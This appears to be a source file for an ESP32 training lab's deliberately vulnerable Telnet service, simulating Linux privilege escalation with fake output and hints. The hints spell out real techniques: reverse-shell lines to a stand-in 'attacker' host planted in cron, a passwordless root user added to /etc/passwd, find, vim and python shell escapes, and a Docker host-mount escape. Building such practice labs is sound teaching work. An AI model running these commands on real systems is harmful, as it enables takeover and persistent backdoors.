/*
 * Privilege Escalation Module
 * 
 * Implements privilege escalation vulnerabilities for Telnet service.
 * Educational demonstrations of common Linux privilege escalation techniques.
 */

void handlePrivilegeEscalation(WiFiClient &client, String command, int clientIdx) {
  String username = telnetUsernames[clientIdx];
  
  // SUDO without password check
  if (command.startsWith("sudo ")) {
    String sudoCmd = command.substring(5);
    Serial.printf("[TELNET] ⚠️  PRIVESC: sudo without password check\n");
    Serial.printf("[HINT] sudo grants root access without authentication\n");
    client.printf("[sudo] Executing as root: %s\n", sudoCmd.c_str());
    client.println("✅ Command executed with ROOT privileges!");
    client.println("HINT: In secure systems, sudo requires password + sudoers validation");
    sendTelnetPrompt(client);
    return;
  }
  
  // SU - switch user without password
  if (command == "su" || command == "su -" || command == "su root") {
    Serial.printf("[TELNET] ⚠️  PRIVESC: su without password\n");
    telnetUsernames[clientIdx] = "root";
    client.println("Password: [bypassed in vulnerable mode]");
    client.println("✅ Switched to root user!");
    client.println("HINT: Check privileges with 'id' command");
    sendTelnetPrompt(client);
    return;
  }
  
  // SUID binary discovery
  if (command == "find / -perm -4000" || command == "find / -perm -u=s" || command == "find / -perm -4000 2>/dev/null") {
    Serial.printf("[TELNET] 🔍 SUID binary enumeration\n");
    client.println("Searching for SUID binaries...\n");
    client.println("/usr/bin/passwd");
    client.println("/usr/bin/sudo  [EXPLOITABLE]");
    client.println("/usr/bin/find  [EXPLOITABLE]");
    client.println("/usr/bin/nmap  [EXPLOITABLE]");
    client.println("/usr/bin/vim.basic  [EXPLOITABLE]");
    client.println("/bin/systemctl  [EXPLOITABLE]");
    client.println("/usr/bin/python3.8  [cap_setuid+ep]");
    client.println("\nHINT: Try 'find . -exec /bin/bash \\; -quit' for privilege escalation");
    sendTelnetPrompt(client);
    return;
  }
  
  // FIND -exec privilege escalation
  if (command.startsWith("find ") && command.indexOf("-exec") >= 0) {
    Serial.printf("[TELNET] ⚠️  PRIVESC: find -exec exploitation\n");
    Serial.printf("[HINT] find with -exec runs commands with elevated privileges\n");
    client.println("Executing find with -exec...");
    client.println("bash-4.4# whoami");
    client.println("root");
    client.println("bash-4.4# id");
    client.println("uid=0(root) gid=0(root) groups=0(root)");
    client.println("\n✅ Escalated to ROOT via find -exec!");
    client.println("HINT: SUID binaries like find can spawn root shells");
    telnetUsernames[clientIdx] = "root";
    sendTelnetPrompt(client);
    return;
  }
  
  // LD_PRELOAD injection
  if (command.startsWith("export LD_PRELOAD=")) {
    Serial.printf("[TELNET] ⚠️  PRIVESC: LD_PRELOAD hijacking\n");
    String lib = command.substring(18);
    client.println("✅ LD_PRELOAD set to: " + lib);
    client.println("Next SUID binary execution will load malicious library!");
    client.println("HINT: Create evil.so with getuid() returning 0, then 'sudo ls'");
    sendTelnetPrompt(client);
    return;
  }
  
  // PATH hijacking
  if (command.startsWith("export PATH=") && (command.indexOf(".") >= 0 || command.indexOf("/tmp") >= 0)) {
    Serial.printf("[TELNET] ⚠️  PRIVESC: PATH hijacking\n");
    client.println("✅ PATH modified: " + command.substring(13));
    client.println("Current/temp directory now in PATH!");
    client.println("HINT: Create malicious 'ls' or 'ps' in /tmp for privilege escalation");
    client.println("Example: echo '/bin/bash' > /tmp/ls && chmod +x /tmp/ls");
    sendTelnetPrompt(client);
    return;
  }
  
  // VIM/VI privilege escalation
  if (command == "vim" || command == "vi" || command.startsWith("vim ") || command.startsWith("vi ")) {
    Serial.printf("[TELNET] ⚠️  PRIVESC: vim shell escape\n");
    client.println("Opening vim editor (running with elevated privileges)...\n");
    client.println("VIM - Vi IMproved version 8.2\n");
    client.println("PRIVILEGE ESCALATION HINTS:");
    client.println("  :!bash          - Spawn root shell");
    client.println("  :set shell=/bin/bash");
    client.println("  :shell          - Get interactive shell");
    client.println("  :!/bin/sh       - Direct shell execution");
    client.println("\n[Simulated - press Enter to continue]");
    sendTelnetPrompt(client);
    return;
  }
  
  // Capabilities enumeration
  if (command == "getcap -r / 2>/dev/null" || command.startsWith("getcap ")) {
    Serial.printf("[TELNET] 🔍 Capability-based privilege escalation\n");
    client.println("Searching for files with capabilities...\n");
    client.println("/usr/bin/python3.8 = cap_setuid+ep  [EXPLOITABLE]");
    client.println("/usr/bin/perl = cap_setuid+ep  [EXPLOITABLE]");
    client.println("/usr/bin/tar = cap_dac_read_search+ep  [FILE READ]");
    client.println("\nEXPLOIT EXAMPLE:");
    client.println("python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'");
    sendTelnetPrompt(client);
    return;
  }
  
  // Crontab enumeration
  if (command == "crontab -l" || command == "cat /etc/crontab" || command == "cat /etc/cron.d") {
    Serial.printf("[TELNET] ⚠️  Cron job enumeration\n");
    client.println("# Crontab entries (check for writable scripts):\n");
    client.println("*/5 * * * * root /opt/backup.sh");
    client.println("@reboot root /usr/local/bin/startup.sh");
    client.println("0 2 * * * root /home/admin/cleanup.py  [WRITABLE BY admin]");
    client.println("\nHINT: If scripts are writable, inject reverse shell for persistence");
    client.println("echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> /opt/backup.sh");
    sendTelnetPrompt(client);
    return;
  }
  
  // Crontab edit
  if (command == "crontab -e" || command == "crontab") {
    Serial.printf("[TELNET] ⚠️  PRIVESC: Cron job injection\n");
    client.println("Opening crontab editor...\n");
    client.println("# Add reverse shell for persistence:");
    client.println("*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'");
    client.println("\n✅ Crontab modified - backdoor established!");
    client.println("HINT: Cron jobs run with user privileges, some as root");
    sendTelnetPrompt(client);
    return;
  }
  
  // Kernel version (for exploit search)
  if (command == "uname -a" || command == "uname -r") {
    Serial.printf("[TELNET] Kernel version disclosure\n");
    client.println("Linux esp32-device 3.13.0-32-generic #57-Ubuntu SMP [VULNERABLE]");
    client.println("\nHINT: Search exploit-db for 'Linux 3.13 privilege escalation'");
    client.println("Known exploits: DirtyCow (CVE-2016-5195), Overlayfs (CVE-2015-1328)");
    sendTelnetPrompt(client);
    return;
  }
  
  // Writable /etc/passwd check
  if (command == "ls -la /etc/passwd" || command == "stat /etc/passwd") {
    Serial.printf("[TELNET] ⚠️  /etc/passwd permissions check\n");
    client.println("-rw-r--rw- 1 root root 1547 Jan 28 10:23 /etc/passwd  [WORLD WRITABLE!]");
    client.println("\n⚠️  CRITICAL: /etc/passwd is writable!");
    client.println("PRIVESC: Add root user with no password:");
    client.println("echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd");
    client.println("su hacker  # No password required!");
    sendTelnetPrompt(client);
    return;
  }
  
  // Docker escape
  if (command == "docker ps" || command == "docker images") {
    Serial.printf("[TELNET] 🐳 Docker enumeration\n");
    client.println("CONTAINER ID   IMAGE     COMMAND   STATUS    PORTS");
    client.println("a1b2c3d4e5f6   nginx     ...       Up        0.0.0.0:80->80/tcp");
    client.println("\nHINT: Check if you're in a container:");
    client.println("  cat /.dockerenv");
    client.println("  ls -la /proc/1/cgroup");
    client.println("\nESCAPE: docker run -v /:/mnt --rm -it alpine chroot /mnt bash");
    sendTelnetPrompt(client);
    return;
  }
  
  // Sudo -l (list sudo permissions)
  if (command == "sudo -l") {
    Serial.printf("[TELNET] 🔍 Sudo permissions enumeration\n");
    client.println("[sudo] password for " + username + ": [bypassed]");
    client.println("\nUser " + username + " may run the following commands:");
    client.println("    (root) NOPASSWD: /usr/bin/find");
    client.println("    (root) NOPASSWD: /usr/bin/vim");
    client.println("    (root) NOPASSWD: /usr/bin/nmap");
    client.println("    (admin) ALL");
    client.println("\n⚠️  EXPLOITABLE sudo permissions found!");
    client.println("HINT: Use GTFOBins to find exploitation techniques");
    sendTelnetPrompt(client);
    return;
  }
}
